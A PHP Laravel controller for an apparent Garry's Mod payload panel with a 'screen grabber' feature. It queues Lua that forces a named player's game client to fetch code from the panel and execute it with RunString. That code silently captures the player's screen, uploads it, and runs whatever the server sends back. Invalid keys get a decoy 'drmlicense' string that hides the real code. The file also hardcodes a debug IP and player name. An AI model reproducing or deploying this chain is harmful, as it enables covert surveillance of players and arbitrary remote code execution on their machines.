<?php

namespace App\Http\Controllers\kermini\special;

use App\Http\Controllers\Controller;
use App\Models\payloads_queue;
use App\Models\Scrgb_Image_Requests;
use App\Models\servers;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use xPaw\SourceQuery\Exception\InvalidArgumentException;
use xPaw\SourceQuery\Exception\InvalidPacketException;
use xPaw\SourceQuery\Exception\SocketException;
use xPaw\SourceQuery\SourceQuery;

class screenGrabber extends Controller
{

    /**
     * @var bool Status of the devlopment system for a local server
     */
    public static $debug = true;

    /**
     * Handles the request for the Screen Grabber selection menu
     *
     * @param $serverid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function getSelectionMenu($serverid=null, Request $request){
        //no serverid verification because php is broken in that fcking specific place

        $server = servers::where('id', $serverid);

        if(
            $server->count() == 1 &&
            $server->first()->user_id == $request->user()->id
        ){
            $server = $server->first();
            $serverid = $server->first()->id;

            return view("scrgrb.selectionmenu",compact(
                "serverid",
                "server"
            ));
        }
        else{
            return redirect()->back()->with(
                'status', "It's not your server :("
            );
        }

    }

    /**
     * Handles the display of the users when requesting the fast screen grabber
     *
     * Verifies data consistency, and bans if needed.
     * Verifies ownership of server and existence.
     * Gets the server infos.
     * Returns to view with infos or don't allow access if server is not accessible.
     *
     * @param $serverid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     * @throws InvalidArgumentException
     * @throws InvalidPacketException
     * @throws SocketException
     */
    public function selectFast($serverid, Request $request){
        //verify data consistency
        if(
            $serverid!=null
            and !is_numeric($serverid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $server = servers::where('id', $serverid);
        //verify ownership of server and existence
        if(
            $server->count() == 1 &&
            $server->first()->user_id == $request->user()->id
        ){

            //get server infos
            $Query = new SourceQuery();
            $server = $server->first();

            $Exception = null;
            try {
                $debug = self::$debug;
                if ($debug)
                {
                    $Query->Connect('46.174.53.204', '27015', 3, SourceQuery::SOURCE);
                }else {
                    $Query->Connect($server->ip, $server->port, 3, SourceQuery::SOURCE);
                }
                //$Query->SetUseOldGetChallengeMethod( true ); // Use this when players/rules retrieval fails on games like Starbound

                $Info = $Query->GetInfo();
                $Players = $Query->GetPlayers();
                $Rules = $Query->GetRules();
            } catch (Exception $e) {
                $Exception = $e;
            } finally {
                $Query->Disconnect();
            }

            if ($Exception == null){
                //return to view with infos
                $type = "Fast";
                return view("scrgrb.playerselector", compact(
                    'server',
                    'serverid',
                    'Players',
                    'type'
                ));
            }else{
                //Don't allow access if server is not accessible
                return redirect()->back()->with(
                    'status', "Server not reachable"
                );
            }


        }
        else{
            return redirect()->back()->with(
                'status', "It's not your server :("
            );
        }

    }

    /**
     * Returns the real Fast-ScreenGrabber code when the player needs it.
     *
     * Verifies if the key exists and it's usage.
     *
     * @param $key
     * @return string
     */
    public function getfCode($key){
        if(
            Scrgb_Image_Requests::where('SCRGBimageKey', $key)->count() == 0
        ){
            return "
                local drmlicense = '".Str::random(30)."'
            ";
        }

        if(Scrgb_Image_Requests::where('SCRGBimageKey', $key)->first()->used == 0){
            return '
                                    hook.Remove( "PostRender", "screenshot" )

                                    local ScreenshotRequested = false
                                    function RequestAScreenshot()
                                        ScreenshotRequested = true
                                    end

                                    RequestAScreenshot()

                                    hook.Add("PostRender", "screenshot", function()
                                        if ( not ScreenshotRequested) then return end

                                        ScreenshotRequested = false

                                        local data = render.Capture( {
                                            format = "png",
                                            x = 0,
                                            y = 0,
                                            w = ScrW(),
                                            h = ScrH()
                                        })

                                        local a = {
                                            d = util.Base64Encode(data),
                                        }
                                        http.Post(
                                            "'.route('saveScreenGrab', ['imagekey' => $key]).'",
                                            a,
                                            function(body, len, headers, code)
                                                RunString(body)
                                            end
                                        )

                                    end)
            ';
        }
        else{
            return "
                local drmlicense = '".Str::random(30)."'
            ";
        }
    }

    /**
     * Handles the initial request for a Fast-ScreenGrab
     *
     * Verifies submitted data via post method.
     * Verifies the ownership of the selected server, must be owned by the person doing the request.
     * We generate a random key between 20 and 32 length.
     * Creates a "request" with Scrgb_Image_Requests, saves the key with a request validity time of 1 hour.
     * We send a payload in the queue telling the server to send custom lua code to the player.
     * Since you can't send more than 255 bits of data via this method we tell the player to query an url and execute the code.
     *
     * @param $serverid
     * @param Request $request
     * @return RedirectResponse
     */
    public function sendFast($serverid, Request $request){
        $customMessages = [
            'required' => ':attribute is missing or the value is invalid.'
        ];

        $validator = Validator::make($request->all(), [
            'player' => 'required|string',
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {
            $server = servers::where('id', $serverid);
            //verify ownership of server and existence
            if(
                $server->count() == 1 &&
                $server->first()->user_id == $request->user()->id
            ){
                $SCRGBrequest_key = Str::random(rand(20,32));

                //creates new request
                $SCRGB_request = new Scrgb_Image_Requests();
                $SCRGB_request->SCRGBimageKey = $SCRGBrequest_key;
                $SCRGB_request->RequestValidFor_Seconds = 3600;
                $SCRGB_request->user_id = $request->user()->id;
                $SCRGB_request->save();

                //custom payload code
                $SCRGB_payload_code = '
                    for i, v in ipairs( player.GetAll() ) do
                        if v:Nick() == "'.((self::$debug) ? "Maxime_48" : $request->player).'" then
                            v:SendLua([[
                                http.Fetch("'.route('getFastCode', ['key' => $SCRGBrequest_key]).'",function(a,b,c,d)RunString(a)end,function(e)print(e)end)
                            ]])
                        end
                    end
                ';

                //registers new payload
                $SCRGB_payload = new payloads_queue();
                $SCRGB_payload->server_id = $serverid;
                $SCRGB_payload->content = $SCRGB_payload_code;
                $SCRGB_payload->description = "ScreenGrabber Payload by: " .
                                              $request->user()->name . " [" . $request->user()->id . "]" .
                                              " for " . $request->player . " on serverid " . $serverid;
                $SCRGB_payload->save();

                return redirect()->route("dashboard")->with(
                    'status', 'Sent'
                );
            }else{
                return redirect()->back()->with(
                    'status', "It's not your server :("
                );
            }

        }

    }

}
